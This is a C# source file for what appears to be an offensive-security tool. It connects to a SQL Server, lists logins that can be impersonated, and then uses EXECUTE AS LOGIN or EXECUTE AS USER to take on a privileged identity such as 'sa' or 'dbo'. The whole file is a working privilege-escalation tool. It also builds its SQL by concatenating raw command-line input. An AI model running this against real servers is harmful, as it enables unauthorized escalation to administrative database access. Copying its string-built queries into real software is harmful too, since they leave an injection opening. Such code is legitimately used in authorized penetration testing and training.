using System;
using System.Data.SqlClient;

// Enumerate Impersonation privileges in SQL Server
// Usage:
// Attempt SQL login impersonation: sqlImpersonate.exe -h <sqlServer> -d master -l <login (sa)>
// Attempt user impersonation: sqlImpersonate.exe -h <sqlServer> -d msdb -u <user (dbo)>

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "";
            String database = "master";
            String target = "";
            String login = "";
            String user = "";

            for (var i = 0; i < args.Length; i++)
            {
                if (args[i] == "-h") { sqlServer = args[i + 1]; }
                else if (args[i] == "-d") { database = args[i + 1]; }
                else if (args[i] == "-l") { login = args[i + 1]; }
                else if (args[i] == "-u") { user = args[i + 1]; }
            }

            if (sqlServer == "")
            {
                Console.WriteLine("Please specify a host with -h <host>");
                Environment.Exit(0);
            }

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }



            if (login != "")
            {
                Console.WriteLine("Attempting login-based impersonation");
                String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
                SqlCommand command = new SqlCommand(query, con);
                SqlDataReader reader = command.ExecuteReader();

                while (reader.Read() == true)
                {
                    Console.WriteLine("Logins that can be impersonated: " + reader[0]);
                }
                reader.Close();

                String querylogin = "SELECT SYSTEM_USER;";
                command = new SqlCommand(querylogin, con);
                reader = command.ExecuteReader();

                reader.Read();
                Console.WriteLine("Before Impersonation, logged in as: " + reader[0]);
                reader.Close();

                String executeas = "EXECUTE AS LOGIN = '" + login + "';";

                command = new SqlCommand(executeas, con);
                reader = command.ExecuteReader();
                reader.Close();

                command = new SqlCommand(querylogin, con);
                reader = command.ExecuteReader();

                reader.Read();
                Console.WriteLine("After Impersonation, logged in as: " + reader[0]);
                reader.Close();
            }

            else if (user != "")
            {
                Console.WriteLine("Attempting user-based impersonation");
                String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
                SqlCommand command = new SqlCommand(query, con);
                SqlDataReader reader = command.ExecuteReader();

                while (reader.Read() == true)
                {
                    Console.WriteLine("Logins that can be impersonated (Not usernames): " + reader[0]);
                }
                reader.Close();

                String querylogin = "SELECT USER_NAME();";
                command = new SqlCommand(querylogin, con);
                reader = command.ExecuteReader();

                reader.Read();
                Console.WriteLine("Before Impersonation, logged in as: " + reader[0]);
                reader.Close();

                String executeas = "EXECUTE AS USER = '" + user + "';";

                command = new SqlCommand(executeas, con);
                reader = command.ExecuteReader();
                reader.Close();

                command = new SqlCommand(querylogin, con);
                reader = command.ExecuteReader();

                reader.Read();
                Console.WriteLine("After Impersonation, logged in as: " + reader[0]);
                reader.Close();
            }

            else
            {
                Console.WriteLine("Error: must use either -u for username impersonation or -l for login impersonation");
            }

            con.Close();
        }
    }
}